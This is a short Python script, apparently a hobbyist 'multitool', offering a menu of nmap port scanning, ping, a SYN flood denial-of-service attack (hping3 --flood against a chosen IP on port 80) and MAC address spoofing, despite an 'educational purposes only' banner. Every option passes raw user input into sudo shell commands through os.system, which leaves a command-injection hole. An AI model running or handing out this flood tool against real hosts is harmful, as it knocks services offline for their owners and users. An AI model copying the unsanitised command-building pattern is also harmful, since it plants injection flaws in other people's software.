import pyfiglet
import os
os.system("aplay ~/Downloads/boing_x.wav")
text = pyfiglet.figlet_format("NEVER MULTITOOL")
print(text)
print("EDUCATIONAL PURPOSES ONLYY!!!")
print("SYSADMIN TOOL")
option = input("""1.NMAP PORT SCAN
         2.PINGER
         3.SYN DOS
         4.MAC SPOOFING
         5.EXIT NEVER""")
if option == "1":
    target_ip = input("What is the target's ip ")
    os.system("sudo nmap " + target_ip)
elif option == "2":
    target_ip = input("What is the ip of the system you Wanna ping? ")
    os.system("ping " + target_ip)
elif option == "3":
    target_ip = input("What is the ip of the target? ")
    os.system("sudo hping3 -S --flood -p 80 " + target_ip)
elif option == "4":
    option = input("What type of network interface do you wanna spoof ( for wifi do wlan0 for ethernet do eth0 ")
    os.system("sudo ifconfig " + option + " down")
    os.system("sudo macchanger -r " + option)
    os.system("sudo ifconfig " + option + " up")
elif option == "5":
    exit()
